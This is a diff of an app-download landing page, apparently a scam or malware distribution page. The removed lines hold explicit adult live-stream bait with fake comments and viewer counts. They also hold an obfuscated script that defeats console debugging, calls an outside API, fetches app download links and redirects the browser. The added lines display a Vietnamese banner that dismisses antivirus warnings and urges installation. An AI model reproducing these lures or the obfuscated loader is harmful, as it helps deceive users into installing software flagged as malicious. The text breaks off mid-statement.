@@ -11,147 +11,51 @@
     <script type="text/javascript" src="./js/jquery-1.11.1.min.js"></script>
     <script type="text/javascript" src="./js/md5.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <link rel="stylesheet" href="./css/index.css">
 </head>
 
 <body>
     <div class="page-wrap" id="app">
-        <img class="banner-img" :src="`./img/${lang}-banner.gif`" alt="">
-        <div class="tip1">{{`${allData[lang].appName}${allData[lang].tip1}`}}</div>
-        <!-- <img class="download-img download" src="./img/btn.png" alt=""> -->
-        <div class="download download-img">{{allData[lang].tip2}}</div>
-        <div class="title-wrap">
-            <span class="left-title">{{allData[lang].tip3}}</span>
-            <img class="beat-img" src="./img/beat.gif" alt="">
+        <div class="header">
+            <img src="./img/sound.png" alt="" class="sound">
+            <div class="marquee">
+                <span>Vì lý do ngành, APP này đã được phần mềm chống vi-rút xác định là vi-rút. Vui lòng sử dụng nó.
+                    Việc
+                    cài đặt Ứng dụng sẽ không gây ra bất kỳ rủi ro bảo mật nào cho điện thoại di động của bạn.</span>
+            </div>
         </div>
-        <div class="img-warp">
-            <div class="img-box" v-for="(item,index) in allData[lang].lives">
-                <img :src="`./img/${item.img}`" alt="">
-                <span class="living pos-ab">
-                    <i></i>
-                    {{allData[lang].live}}
-                </span>
-                <span class="tag pos-ab" :style="`background:${item.color}`" v-if="item.tip">{{item.tip}}</span>
-                <div class="play_bott pos-ab go-h5">
-                    <div></div>
-                </div>
-                <div class="live_foot pos-ab">
-                    <div :class="{'f-y-center':lang==='zh'}">
-                        <div>{{item.name}}</div>
-                        <div>{{item.age}}</div>
-                    </div>
-                    <span>{{item.people}}</span>
+
+        <img src="./img/logo.png" alt="" class="logo">
+        <img src="./img/url.png" alt="" class="url">
+        <img src="./img/tip3.png" alt="" class="tip3">
+        <img src="./img/game.png" alt="" class="game">
+        <img src="./img/download.gif" alt="" class="download" @click="onDownloadApp">
+        <div class="showbox">
+            <img src="./img/tip0.png" alt="" class="showbox-title">
+            <div v-for="(item,index) in allData[lang].hots" class="show-item">
+                <img :src="`./img/tip-img-${index}.png`" alt="" class="show-item-img">
+                <div style="padding: 0 0.2rem;">
+                    <div class="show-t-0">{{item.name}}</div>
+                    <div class="show-t-1">{{item.title}}</div>
                 </div>
             </div>
         </div>
 
-        <div class="more-live go-h5" style="margin-top:.21rem">{{allData[lang].tip4}}</div>
-        <div class="title-wrap">
-            <span class="left-title">{{allData[lang].tip5}}</span>
-            <img class="beat-img" src="./img/beat.gif" alt="">
-        </div>
-        <div class="comment">
-            <div class="comment-wrap" v-for="(item,index) in allData[lang].hots">
-                <img class="avatar" :src="`./img/avatar${item.avatar}.png`" alt="">
-                <div>
-                    <div class="name">{{item.name}}</div>
-                    <div class="comment-info">{{item.title}}</div>
-                </div>
-                <div class="time">{{item.time}}</div>
+        <div class="showbox" style="margin-top: 0.4rem;">
+            <img src="./img/tip1.png" alt="" class="showbox-title">
+            <div v-for="(item,index) in downloadList" class="show-item">
+
+                <div style="font-size: 0.32rem;display: flex;align-items: center;">{{`URL${index+1}：`}}<span
+                        style="color: #FF0000;">{{item.urlName}}</span></div>
+                <div class="download-item" @click="onDownloadApp">Mở</div>
             </div>
         </div>
-        <div class="more-live go-h5">{{allData[lang].tip6}}</div>
-        <div class="tip2">{{allData[lang].tip7}}</div>
-        <div class="tip3">
-            {{`${allData[lang].appName} 2008-2023`}}
-        </div>
-        <img class="bottom-img download" :src="`./img/${lang}-bottom.gif`" alt="">
+        <img src="./img/service.gif" alt="" class="service" @click="onService">
+       
     </div>
     <script>
-        new Vue({
-            el: '#app',
-            data: {
-                lang: 'zh',
-                langs: ['zh', 'vi'],
-                code: '',
-                reg: '',
-                allData: {
-                    'zh': {
-                        'appName': 'panda直播',
-                        'tip1': '有稳定的运营收入，绝不含恶意程序，请放心使用',
-                        'tip2': '立即下载',
-                        'tip3': '热门直播',
-                        'tip4': '更多直播',
-                        'tip5': '热门评论',
-                        'tip6': '加入官方群组，一起畅聊',
-                        'tip7': '如果您未满18岁或当地法律未允许成人内容请停止访问此网站',
-                        'tip9': '邀请码复制成功',
-                        'tip10': '邀请码复制失败',
-                        'live': '直播中',
-                        'lives': [
-                            { 'name': '娜娜', 'people': '58632人在线', 'age': '20岁', 'tip': '直播做爱', 'img': 'live-img-0-l.gif', 'color': '#ff3360' },
-                            { 'name': '猫儿酱', 'people': '46583人在线', 'age': '21岁', 'tip': '激情自慰', 'img': 'live-img-0-r.gif', 'color': 'rgb(168, 48, 255)' },
-                            { 'name': '梦璃', 'people': '34118人在线', 'age': '25岁', 'tip': '互动聊骚', 'img': 'live-img-2.jpg', 'color': 'rgb(66, 175, 255)' },
-                            { 'name': '大大芭姬', 'people': '75964人在线', 'age': '22岁', 'tip': '空降女友', 'img': 'live-img-3.jpg', 'color': '#ff3360' },
-                            { 'name': '小迪', 'people': '28856人在线', 'age': '20岁', 'tip': '多人大秀', 'img': 'live-img-4.jpg', 'color': 'rgb(255, 96, 2)' },
-                            { 'name': '萱萱', 'people': '31882人在线', 'age': '24岁', 'tip': '酮体诱惑', 'img': 'live-img-5.jpg', 'color': 'rgb(255, 0, 207)' },
-                        ],
-                        'hots': [
-                            { 'name': '挪威的森林', 'avatar': 1, 'title': '这个时间点看这APP，让我想到一首歌"想要，想要，我快要受不了', 'time': '15 秒前' },
-                            { 'name': '黄药师', 'avatar': 2, 'title': '我的挺好的呀，妳要放哪都可以，还会时不时上点润滑，有时如铁一般硬，有时又如水一样柔软，可以搭配妳的需求使用～～', 'time': '53 秒前' },
-                            { 'name': '天道酬勤', 'avatar': 3, 'title': '一日之际在于晨，上班前看下小姐姐，会带来美好的一天', 'time': '2 分钟前' },
-                            { 'name': '山街十二少', 'avatar': 4, 'title': '女主播质量都很高啊，有望接班传奇猫先生，建议学学猫先生的拍摄角度，加油兄弟，支持', 'time': '3 分钟前' },
-                            { 'name': '江森先生', 'avatar': 5, 'title': '关键时候还得看少妇，有气质，有韵味，身材也不错，动起来的能力很强呀！！！', 'time': '6 分钟前' },
-                            { 'name': '铁棍山药', 'avatar': 6, 'title': '点赞(´｡✪ω✪｡｀)，还是原创直播更爽呀，下次让主播去 户外试试...', 'time': '21 分钟前' },
-                            { 'name': '深井冰1号', 'avatar': 7, 'title': '男主比我太弱了，可惜了这么好的奶牛，哎', 'time': '26 分钟前' },
-                            { 'name': '大王下山', 'avatar': 8, 'title': '女主播说受不了了要喷了，各位看官快来瞧瞧', 'time': '46 分钟前' },
-                        ]
-                    },
-                    'vi': {
-                        'appName': 'Quả anh đào ',
-                        'tip1': 'có thu nhập hoạt động ổn định và không chứa các chương trình độc hại, các bạn cứ yên tâm sử dụng.',
-                        'tip2': 'Tải về ngay lập tức',
-                        'tip3': 'Phát sóng trực tiếp phổ biến',
-                        'tip4': 'Nhiều chương trình phát sóng trực tiếp hơn',
-                        'tip5': 'Nhận xét hàng đầu',
-                        'tip6': 'Tham gia nhóm chính thức và trò chuyện cùng nhau',
-                        'tip7': 'Nếu bạn dưới 18 tuổi hoặc luật pháp địa phương không cho phép nội dung người lớn Vui lòng ngừng truy cập trang web này',
-                        'tip9': 'Mã lời mời được sao chép thành công',
-                        'tip10': 'Không sao chép được mã lời mời',
-                        'live': 'Phát sóng trực tiếp',
-                        'lives': [
-                            { 'name': 'Nana', 'people': '58632 người trực tuyến', 'age': '20 tuổi', 'img': 'live-img-0-l.gif' },
-                            { 'name': 'Sam', 'people': '46583 người trực tuyến', 'age': '21 tuổi', 'img': 'live-img-0-r.gif' },
-                            { 'name': 'Celian', 'people': '34118 người trực tuyến', 'age': '25 tuổi', 'img': 'live-img-2.jpg' },
-                            { 'name': 'Jenna', 'people': '75964 người trực tuyến', 'age': '22 tuổi', 'img': 'live-img-3.jpg' },
-                            { 'name': 'Chloe', 'people': '28856 người trực tuyến', 'age': '20 tuổi', 'img': 'live-img-4.jpg' },
-                            { 'name': 'Stella', 'people': '31882 người trực tuyến', 'age': '24 tuổi', 'img': 'live-img-5.jpg' },
-                        ],
-                        'hots': [
-                            { 'name': 'Khu rừng ở Na Uy', 'avatar': 1, 'title': 'Nhìn APP này lúc này lại nhớ đến bài hát "Muốn nó, thèm quá, chịu không nổi nữa"', 'time': '15 giây trước', 'img': 'live-img-0-l.gif', 'color': '#ff3360' },
-                            { 'name': 'Hoàng Dược Sư', 'avatar': 2, 'title': 'Của tôi khá tốt, bạn có thể đặt nó ở bất cứ đâu bạn muốn, và thỉnh thoảng bạn có thể bôi trơn nó. Lúc thì cứng như sắt, lúc thì mềm như nước. Bạn có thể sử dụng tùy theo nhu cầu của mình~~', 'time': '53 giây trước' },
-                            { 'name': 'ngày qua ngày', 'avatar': 3, 'title': 'Buổi sáng là sự khởi đầu của một ngày, ngắm nhìn cô gái trẻ trước khi đi làm sẽ mang đến một ngày tuyệt vời.', 'time': '2 phút trước' },
-                            { 'name': '12 ít hơn', 'avatar': 4, 'title': 'Chất lượng của các mỏ neo nữ rất cao, được kỳ vọng sẽ nối nghiệp Mr.Cat huyền thoại. Khuyên các bạn nên học hỏi những góc chụp của Mr.Cat. Thôi các anh em ủng hộ nhé', 'time': '3 phút trước' },
-                            { 'name': 'Ông Johnson', 'avatar': 5, 'title': 'Vào thời điểm quan trọng, bạn phải nhìn vào người phụ nữ trẻ, cô ấy có khí chất, sự quyến rũ, dáng người đẹp và khả năng di chuyển mạnh mẽ! ! !', 'time': '6 phút trước' },
-                            { 'name': 'thanh sắt khoai lang', 'avatar': 6, 'title': 'Giống như (`｡✪ω✪｡｀), buổi phát sóng trực tiếp ban đầu thú vị hơn, lần sau hãy để người dẫn chương trình thử ngoài trời...', 'time': '21 phút trước' },
-                            { 'name': 'Đá Sham Tsing số 1', 'avatar': 7, 'title': 'Nam chính so với ta yếu quá, trâu tốt như vậy thật đáng tiếc, ugh', 'time': '26 phút trước' },
-                            { 'name': 'Nhà vua xuống núi', 'avatar': 8, 'title': 'Nữ phát thanh viên nói không chịu nổi nữa muốn phun nước, các vị đến xem xem.', 'time': '46 phút trước' },
-                        ]
-                    },
-                }
-            },
-            mounted() {
-                this.reg = window.location.href.split("/")[3]
-                if (this.reg && this.reg.length >= 7) {
-                    this.lang = this.langs[this.reg.slice(0, -6)] || 'zh';
-                } else {
-                    console.log(getCurrentLanguage())
-                    this.lang = getCurrentLanguage()[0]
-                }
-                document.title = this.allData[this.lang].appName
-            },
-        });
-        const _0x1a37=['bVZQY0U=','UFNRWnM=','Y05aQUU=','bG9jYXRpb24=','aE1QaVg=','aW9jS3U=','VGFRT2Y=','S2lQQUw=','UWxDZUo=','TlVLSWw=','QnFkbGk=','TWN1anM=','aGtMc0c=','ZGF0YQ==','cmVtb3Zl','c3RwcG8=','YWZhamg=','SWZuR3A=','cmVnPQ==','dEN0a0Y=','eU1jTnE=','RXVQeGQ=','UXF3UlM=','VGVJeGc=','dGFibGU=','d3JpdGVUZXh0','clhwSXI=','LmdvLWg1','WEJZcG0=','Y2xpY2s=','blpaQkg=','ZXhjZXB0aW9u','Y29uc29sZQ==','YXBwbGljYXRpb24vanNvbg==','ckNVV2U=','TExtbkk=','NmZmZiwzMzQ0MzIy','cVB6VWc=','SlVYbnk=','LmRvd25sb2Fk','cG9zaXRpb24=','bWQ1','ZXhlY0NvbW1hbmQ=','L3Byb21vdGlvbi9hcHAvdXNlci9zYXZlTG9hZGluZ1JlY29yZD9zaWRlQ29kZT0g','WVhNaWI=','cmJuWmE=','T3Fmcm4=','cmV0dXJuIChmdW5jdGlvbigpIA==','cG9zdA==','Q29weQ==','THdHYUg=','TXhSb0Y=','RXZ6SU4=','QU9HU2I=','Q3hnR3c=','ZGVidWc=','ZUhDTWg=','XihbXiBdKyggK1teIF0rKSspK1teIF19','S0tNWkw=','R1JtZkM=','YWpheA==','QUMxOTdCREZFNjg1NzExRDg4QjY1NTczNUQ4RUI2MzA=','ZmlsdGVy','cXpCT08=','YUxibmg=','bGVuZ3Ro','aHJlZg==','YUJuTlE=','anNvbg==','VkZXdlo=','Z1JDYWE=','dHJhY2U=','dURrT0w=','ZlBUWXk=','ak1rc2M=','aW5mbw==','Zk5HV1U=','amhCbnA=','dmFsdWU=','Ym9keQ==','ZEdMZXM=','Z21BUkg=','ZmlnTXc=','dXJsRG93bg==','RWtkalQ=','Qnd4Y1c=','eWFlYVc=','YmFDZmM=','Z2V0','alFwY0U=','bUxWUHU=','YXNQRno=','e30uY29uc3RydWN0b3IoInJldHVybiB0aGlzIikoICk=','S0tjdXg=','ZU9XTHE=','dGVzdA==','S3V1RXI=','c2xpY2U=','c2RaYks=','RW5WUk4=','TklOU0E=','bG9n','bXdsRnE=','ZE1IQlM=','V0dLV2s=','c3BsaXQ=','Wkd6c0c=','L3Byb21vdGlvbi9hcHAvdXNlci9sYW5kaW5ncGFnZS9saXN0','6YKA6K+356CB5aSN5Yi25aSx6LSl','6YKA6K+356CB5aSN5Yi25oiQ5Yqf','WGhkQVA=','THR6cU8=','REdXYXM=','aHR0cHM6Ly9hcGkuYzRwcmZ5LmNvbQ==','ZHhpQ1I=','cUt6Y0Q=','dGhlbg==','YXBwbHk=','TVBzbUM=','c3RyaW5naWZ5','U21Gb3c=','ZXJyb3I=','a2h5Z2w=','VnJrTk8=','d1VLa2c=','Y2xpcGJvYXJk','d2Fybg==','cmV0dXJuIC8iICsgdGhpcyArICIv','dnN6c2I=','SU9T','dmF1R1k=','c2VjcmV0'];(function(_0xc4b163,_0x1a37d6){const _0x7369b7=function(_0xb37673){while(--_0xb37673){_0xc4b163['push'](_0xc4b163['shift']());}};const _0x3f15eb=function(){const _0xd125ff={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x5cba5d,_0x370049,_0x3d014f,_0x3001b3){_0x3001b3=_0x3001b3||{};let _0x4124d5=_0x370049+'='+_0x3d014f;let _0x2df7e4=0x0;for(let _0x204655=0x0,_0x541988=_0x5cba5d['length'];_0x204655<_0x541988;_0x204655++){const _0x16c4d4=_0x5cba5d[_0x204655];_0x4124d5+=';\x20'+_0x16c4d4;const _0x2e1e38=_0x5cba5d[_0x16c4d4];_0x5cba5d['push'](_0x2e1e38);_0x541988=_0x5cba5d['length'];if(_0x2e1e38!==!![]){_0x4124d5+='='+_0x2e1e38;}}_0x3001b3['cookie']=_0x4124d5;},'removeCookie':function(){return'dev';},'getCookie':function(_0x423095,_0x1bd239){_0x423095=_0x423095||function(_0x3b28d2){return _0x3b28d2;};const _0x282071=_0x423095(new RegExp('(?:^|;\x20)'+_0x1bd239['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));const _0x46808e=function(_0x1f1b6c,_0x4a5ad9){_0x1f1b6c(++_0x4a5ad9);};_0x46808e(_0x7369b7,_0x1a37d6);return _0x282071?decodeURIComponent(_0x282071[0x1]):undefined;}};const _0x3401f6=function(){const _0x560d5a=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x560d5a['test'](_0xd125ff['removeCookie']['toString']());};_0xd125ff['updateCookie']=_0x3401f6;let _0x13fbb8='';const _0x34dd47=_0xd125ff['updateCookie']();if(!_0x34dd47){_0xd125ff['setCookie'](['*'],'counter',0x1);}else if(_0x34dd47){_0x13fbb8=_0xd125ff['getCookie'](null,'counter');}else{_0xd125ff['removeCookie']();}};_0x3f15eb();}(_0x1a37,0x97));const _0x7369=function(_0xc4b163,_0x1a37d6){_0xc4b163=_0xc4b163-0x0;let _0x7369b7=_0x1a37[_0xc4b163];if(_0x7369['DNsUYM']===undefined){(function(){const _0xb37673=function(){let _0x13fbb8;try{_0x13fbb8=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x34dd47){_0x13fbb8=window;}return _0x13fbb8;};const _0xd125ff=_0xb37673();const _0x3401f6='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xd125ff['atob']||(_0xd125ff['atob']=function(_0x5cba5d){const _0x370049=String(_0x5cba5d)['replace'](/=+$/,'');let _0x3d014f='';for(let _0x3001b3=0x0,_0x4124d5,_0x2df7e4,_0x204655=0x0;_0x2df7e4=_0x370049['charAt'](_0x204655++);~_0x2df7e4&&(_0x4124d5=_0x3001b3%0x4?_0x4124d5*0x40+_0x2df7e4:_0x2df7e4,_0x3001b3++%0x4)?_0x3d014f+=String['fromCharCode'](0xff&_0x4124d5>>(-0x2*_0x3001b3&0x6)):0x0){_0x2df7e4=_0x3401f6['indexOf'](_0x2df7e4);}return _0x3d014f;});}());_0x7369['FUvIXQ']=function(_0x541988){const _0x16c4d4=atob(_0x541988);let _0x2e1e38=[];for(let _0x423095=0x0,_0x1bd239=_0x16c4d4['length'];_0x423095<_0x1bd239;_0x423095++){_0x2e1e38+='%'+('00'+_0x16c4d4['charCodeAt'](_0x423095)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2e1e38);};_0x7369['CQmDMR']={};_0x7369['DNsUYM']=!![];}const _0x3f15eb=_0x7369['CQmDMR'][_0xc4b163];if(_0x3f15eb===undefined){const _0x282071=function(_0x46808e){this['tMplxv']=_0x46808e;this['jgqaqE']=[0x1,0x0,0x0];this['eVzeFf']=function(){return'newState';};this['dSaIpi']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['BrcBby']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x282071['prototype']['vCYYuf']=function(){const _0x3b28d2=new RegExp(this['dSaIpi']+this['BrcBby']);const _0x1f1b6c=_0x3b28d2['test'](this['eVzeFf']['toString']())?--this['jgqaqE'][0x1]:--this['jgqaqE'][0x0];return this['TPDALV'](_0x1f1b6c);};_0x282071['prototype']['TPDALV']=function(_0x4a5ad9){if(!Boolean(~_0x4a5ad9)){return _0x4a5ad9;}return this['hXcITP'](this['tMplxv']);};_0x282071['prototype']['hXcITP']=function(_0x560d5a){for(let _0x520bf8=0x0,_0x301c50=this['jgqaqE']['length'];_0x520bf8<_0x301c50;_0x520bf8++){this['jgqaqE']['push'](Math['round'](Math['random']()));_0x301c50=this['jgqaqE']['length'];}return _0x560d5a(this['jgqaqE'][0x0]);};new _0x282071(_0x7369)['vCYYuf']();_0x7369b7=_0x7369['FUvIXQ'](_0x7369b7);_0x7369['CQmDMR'][_0xc4b163]=_0x7369b7;}else{_0x7369b7=_0x3f15eb;}return _0x7369b7;};const _0x5cba5d=function(){const _0xac62bc={};_0xac62bc[_0x7369('0x71')]=function(_0xfd3a0,_0x2240fc){return _0xfd3a0+_0x2240fc;};_0xac62bc[_0x7369('0x63')]=_0x7369('0x83');_0xac62bc['yMcNq']=function(_0x266038,_0x41d891){return _0x266038===_0x41d891;};_0xac62bc['LLmnI']=function(_0xcdf81c){return _0xcdf81c();};_0xac62bc['defJM']='IOS';_0xac62bc['LwGaH']=function(_0x34496b,_0x17f6ec){return _0x34496b(_0x17f6ec);};_0xac62bc[_0x7369('0x21')]=_0x7369('0x4d');const _0x1bdda6=_0xac62bc;let _0x414fb6=!![];return function(_0x138010,_0x460ca1){const _0x45a46a={};_0x45a46a[_0x7369('0x9')]=function(_0x55a9d5,_0x4515af){return _0x1bdda6[_0x7369('0x71')](_0x55a9d5,_0x4515af);};_0x45a46a[_0x7369('0x5f')]=_0x1bdda6[_0x7369('0x63')];_0x45a46a['KKMZL']=function(_0x2e6b52,_0x197d9b){return _0x1bdda6[_0x7369('0x1')](_0x2e6b52,_0x197d9b);};_0x45a46a[_0x7369('0x23')]=function(_0x33e703){return _0x1bdda6[_0x7369('0x10')](_0x33e703);};_0x45a46a[_0x7369('0x39')]=_0x1bdda6['defJM'];_0x45a46a['baCfc']=function(_0x1f973d,_0x1b1496){return _0x1bdda6[_0x7369('0x1f')](_0x1f973d,_0x1b1496);};_0x45a46a[_0x7369('0x2d')]=_0x1bdda6['EvzIN'];const _0x59f710=_0x45a46a;const _0x8afc41=_0x414fb6?function(){if(_0x460ca1){if(_0x59f710[_0x7369('0x27')](_0x59f710['aLbnh'],_0x59f710[_0x7369('0x2d')])){const _0x3d7778=_0x460ca1['apply'](_0x138010,arguments);_0x460ca1=null;return _0x3d7778;}else{let _0x186dd1=_0x59f710[_0x7369('0x9')](_0x59f710[_0x7369('0x5f')],reg);if(_0x59f710['KKMZL'](_0x59f710[_0x7369('0x23')](judgeClient),_0x59f710['fNGWU'])){_0x59f710[_0x7369('0x44')](downloadApp,ios);}else{_0x59f710[_0x7369('0x44')](downloadApp,Android);}}}}:function(){};_0x414fb6=![];return _0x8afc41;};}();const _0x34dd47=_0x5cba5d(this,function(){const _0x5801cc={};_0x5801cc['TaQOf']=function(_0x56b9ad,_0x3856dd){return _0x56b9ad===_0x3856dd;};_0x5801cc['rCUWe']=_0x7369('0x7b');_0x5801cc[_0x7369('0x68')]=_0x7369('0x57');_0x5801cc[_0x7369('0x1b')]=_0x7369('0x6c');_0x5801cc[_0x7369('0x50')]=_0x7369('0x26');_0x5801cc[_0x7369('0x79')]=function(_0x592fd5){return _0x592fd5();};const _0x400aed=_0x5801cc;const _0x646d46=function(){if(_0x400aed[_0x7369('0x77')](_0x400aed[_0x7369('0xf')],_0x400aed[_0x7369('0x68')])){location[_0x7369('0x2f')]=res['data'];}else{const _0xa247b7=_0x646d46['constructor'](_0x400aed[_0x7369('0x1b')])()['compile'](_0x400aed[_0x7369('0x50')]);return!_0xa247b7[_0x7369('0x4c')](_0x34dd47);}};return _0x400aed[_0x7369('0x79')](_0x646d46);});_0x34dd47();const _0xd125ff=function(){const _0x4a9d55={};_0x4a9d55[_0x7369('0x81')]=function(_0x103147){return _0x103147();};_0x4a9d55[_0x7369('0x3f')]=function(_0x1d1a04,_0x2c2c91){return _0x1d1a04===_0x2c2c91;};_0x4a9d55[_0x7369('0x41')]=_0x7369('0x3d');_0x4a9d55[_0x7369('0x30')]=_0x7369('0x51');const _0x4eb07b=_0x4a9d55;let _0xf0beff=!![];return function(_0xc29d74,_0xdb6ca){const _0x1e26b9=_0xf0beff?function(){const _0xe2895f={};_0xe2895f[_0x7369('0x7d')]=function(_0x336a10){return _0x4eb07b[_0x7369('0x81')](_0x336a10);};const _0x332e86=_0xe2895f;if(_0x4eb07b[_0x7369('0x3f')]('ulNqS',_0x4eb07b['EkdjT'])){sideCode=_0x332e86['hkLsG'](getCurrentLanguage)[0x1];}else{if(_0xdb6ca){if(_0x7369('0x51')!==_0x4eb07b['aBnNQ']){const _0x1675d0=_0xf0beff?function(){if(_0xdb6ca){const _0x5f4190=_0xdb6ca[_0x7369('0x62')](_0xc29d74,arguments);_0xdb6ca=null;return _0x5f4190;}}:function(){};_0xf0beff=![];return _0x1675d0;}else{const _0xf3d007=_0xdb6ca['apply'](_0xc29d74,arguments);_0xdb6ca=null;return _0xf3d007;}}}}:function(){};_0xf0beff=![];return _0x1e26b9;};}();const _0xb37673=_0xd125ff(this,function(){const _0x54356a={};_0x54356a[_0x7369('0x33')]=_0x7369('0x59');_0x54356a[_0x7369('0x0')]=_0x7369('0x60');_0x54356a[_0x7369('0x65')]=function(_0x43b2c3,_0x1731f4){return _0x43b2c3===_0x1731f4;};_0x54356a[_0x7369('0x76')]='PThdA';_0x54356a['rbnZa']=function(_0x3589f8,_0x4a4586){return _0x3589f8(_0x4a4586);};_0x54356a[_0x7369('0x4')]=function(_0xbc0f9d,_0xb0f210){return _0xbc0f9d+_0xb0f210;};_0x54356a['YUrgv']=_0x7369('0x1c');_0x54356a['eHCMh']=_0x7369('0x49');_0x54356a['DGWas']=function(_0x3b839b){return _0x3b839b();};_0x54356a[_0x7369('0x6f')]=function(_0x723173,_0x2c314f){return _0x723173===_0x2c314f;};_0x54356a[_0x7369('0x3a')]=_0x7369('0x48');_0x54356a[_0x7369('0x72')]=_0x7369('0x3e');_0x54356a[_0x7369('0x55')]='6|1|5|0|7|3|4|2';const _0x5c7af7=_0x54356a;const _0xf79279=function(){};const _0x418059=function(){const _0x22ca61={};_0x22ca61[_0x7369('0x6d')]=_0x5c7af7[_0x7369('0x33')];const _0x47eb18=_0x22ca61;if(_0x7369('0x60')===_0x5c7af7['tCtkF']){let _0x176196;try{if(_0x5c7af7[_0x7369('0x65')](_0x5c7af7[_0x7369('0x76')],_0x5c7af7['iocKu'])){_0x176196=_0x5c7af7['rbnZa'](Function,_0x5c7af7[_0x7369('0x4')](_0x5c7af7['TeIxg'](_0x5c7af7['YUrgv'],_0x5c7af7[_0x7369('0x25')]),');'))();}else{const _0x24c915={};_0x24c915[_0x7369('0x42')]=_0x7369('0x5a');const _0x5b6718=_0x24c915;navigator['clipboard']['writeText'](newText)[_0x7369('0x61')](()=>{console[_0x7369('0x52')](_0x5b6718['BwxcW']);},()=>{console[_0x7369('0x52')](_0x47eb18[_0x7369('0x6d')]);});}}catch(_0x5ca33b){_0x176196=window;}return _0x176196;}else{if(fn){const _0x1c53dd=fn[_0x7369('0x62')](context,arguments);fn=null;return _0x1c53dd;}}};const _0x1b0471=_0x5c7af7[_0x7369('0x5d')](_0x418059);if(!_0x1b0471[_0x7369('0xd')]){_0x1b0471[_0x7369('0xd')]=function(_0x3b684d){const _0x83a3fe={};_0x83a3fe['log']=_0x3b684d;_0x83a3fe[_0x7369('0x6b')]=_0x3b684d;_0x83a3fe[_0x7369('0x24')]=_0x3b684d;_0x83a3fe[_0x7369('0x38')]=_0x3b684d;_0x83a3fe[_0x7369('0x66')]=_0x3b684d;_0x83a3fe[_0x7369('0xc')]=_0x3b684d;_0x83a3fe[_0x7369('0x5')]=_0x3b684d;_0x83a3fe[_0x7369('0x34')]=_0x3b684d;return _0x83a3fe;}(_0xf79279);}else{if(_0x5c7af7[_0x7369('0x6f')](_0x5c7af7['jhBnp'],_0x5c7af7[_0x7369('0x72')])){let _0x1d6fb4=res;if(_0x1d6fb4[_0x7369('0x70')]){_0x1d6fb4[_0x7369('0x7e')]=_0x5c7af7[_0x7369('0x1a')](decrypt,_0x1d6fb4['data']);}if(res[_0x7369('0x7e')]){location[_0x7369('0x2f')]=res['data'];}}else{const _0x5733f9=_0x5c7af7['WGKWk'][_0x7369('0x56')]('|');let _0x38deaa=0x0;while(!![]){switch(_0x5733f9[_0x38deaa++]){case'0':_0x1b0471[_0x7369('0xd')][_0x7369('0x38')]=_0xf79279;continue;case'1':_0x1b0471[_0x7369('0xd')][_0x7369('0x6b')]=_0xf79279;continue;case'2':_0x1b0471['console']['trace']=_0xf79279;continue;case'3':_0x1b0471[_0x7369('0xd')]['exception']=_0xf79279;continue;case'4':_0x1b0471[_0x7369('0xd')][_0x7369('0x5')]=_0xf79279;continue;case'5':_0x1b0471[_0x7369('0xd')][_0x7369('0x24')]=_0xf79279;continue;case'6':_0x1b0471['console'][_0x7369('0x52')]=_0xf79279;continue;case'7':_0x1b0471[_0x7369('0xd')][_0x7369('0x66')]=_0xf79279;continue;}break;}}}});_0xb37673();let apiUrl=_0x7369('0x5e');let ios={};let Android={};let h5={};let locationUrl=window[_0x7369('0x74')]['href'];let reg=locationUrl[_0x7369('0x56')]('/')[0x3];let sideCode=reg[_0x7369('0x4e')](0x0,-0x6)||0x0;if(reg[_0x7369('0x2e')]>=0x7){sideCode=reg[_0x7369('0x4e')](0x0,-0x6);}else{sideCode=getCurrentLanguage()[0x1];}let date=+new Date();$[_0x7369('0x29')]({'url':apiUrl+_0x7369('0x58'),'type':_0x7369('0x1d'),'dateType':_0x7369('0x31'),'headers':{'Content-type':'application/json','X-UDID':_0x7369('0x2a'),'X-Timestamp':date,'X-Sign':$[_0x7369('0x16')](_0x7369('0x2a')+'6fff,3344322'+date),'side_code':sideCode},'data':JSON[_0x7369('0x64')](),'success':function(_0x27e6c0){const _0x423440={};_0x423440[_0x7369('0x36')]=function(_0x579b27,_0x27012b){return _0x579b27(_0x27012b);};const _0x106dbd=_0x423440;let _0x38846f=_0x27e6c0;let _0x54a447=_0x38846f['data'];if(_0x38846f[_0x7369('0x70')]){_0x54a447=_0x106dbd['fPTYy'](decrypt,_0x27e6c0[_0x7369('0x7e')]);}ios=_0x54a447[_0x7369('0x2b')](_0xdbdd40=>_0xdbdd40['position']===0x4)[0x0];Android=_0x54a447[_0x7369('0x2b')](_0x3e91b6=>_0x3e91b6['position']===0x1)[0x0];h5=_0x54a447[_0x7369('0x2b')](_0x2460fb=>_0x2460fb[_0x7369('0x15')]===0x2)[0x0];}});function statistics(_0x34f731){const _0x35b4c7={};_0x35b4c7[_0x7369('0x19')]=_0x7369('0x18');_0x35b4c7[_0x7369('0x53')]=function(_0xc6aabf,_0x26cec2){return _0xc6aabf+_0x26cec2;};_0x35b4c7[_0x7369('0x2')]=function(_0x2670d3,_0x3c6431){return _0x2670d3+_0x3c6431;};_0x35b4c7['wUKkg']='/promotion/app/user/saveLoadingRecord?sideCode=';_0x35b4c7['xXIVT']='application/json';_0x35b4c7[_0x7369('0x7a')]='AC197BDFE685711D88B655735D8EB630';_0x35b4c7[_0x7369('0x5c')]=function(_0x19affb,_0x1c38b9){return _0x19affb+_0x1c38b9;};_0x35b4c7['AOGSb']=_0x7369('0x11');const _0x21209d=_0x35b4c7;let 